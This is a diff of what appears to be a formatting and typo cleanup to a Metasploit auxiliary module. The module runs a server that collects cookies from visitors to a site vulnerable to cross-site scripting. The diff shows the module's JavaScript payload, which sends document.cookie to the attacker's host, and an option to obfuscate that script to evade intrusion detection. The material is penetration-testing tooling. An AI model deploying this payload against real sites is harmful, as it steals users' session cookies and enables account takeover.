@@ -13,10 +13,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'			=> 'Capture: HTTP looging of cookies',
+			'Name'			=> 'Capture: HTTP Looging Of Cookies',
 			'Description'	=> %q{
-					This modules runs a webserver that captures cookies from clients of 
-				a website vulnerable to cross site scripting. In an attemt 
+					This modules runs a webserver that captures cookies from clients of
+				a website vulnerable to cross site scripting. In an attempt
 				to evads IDS this module has an option to obfuscate the generated javascript.
 				To use this script, the following javascript must be injected on the XSS vunlerable
 				site:
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 		when /\/data\/(.*)/
 			cookies = request.uri.to_s[6..-1].split(';')
 			cookiesh = Hash.new()
-			cookies.each do |item|	
+			cookies.each do |item|
 				a,b = item.split('=')
 				cookiesh[a] = b
 			end
@@ -86,7 +86,7 @@ class Metasploit3 < Msf::Auxiliary
 	#we know nothing!
 	send_not_found(cli)
 	end
-	
+
 	# Figure out what our base URL is based on the user submitted
 	# Host header or the address of the client.
 	# This def is shamelessly stolen from the http_javascript_keylogger - thanks Marcus! :-)
@@ -129,9 +129,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	#Generation and obfuscation of javascript
 	def generate_js(base_url)
-		 code = ::Rex::Exploitation::JSObfu.new %Q|
-				new Image().src="#{base_url}data/"+document.cookie;|
- 		if datastore['OBFUSCATE_JAVASCRIPT']
+		code = ::Rex::Exploitation::JSObfu.new %Q|
+		new Image().src="#{base_url}data/"+document.cookie;|
+
+		if datastore['OBFUSCATE_JAVASCRIPT']
 			code.obfuscate
 		end
 
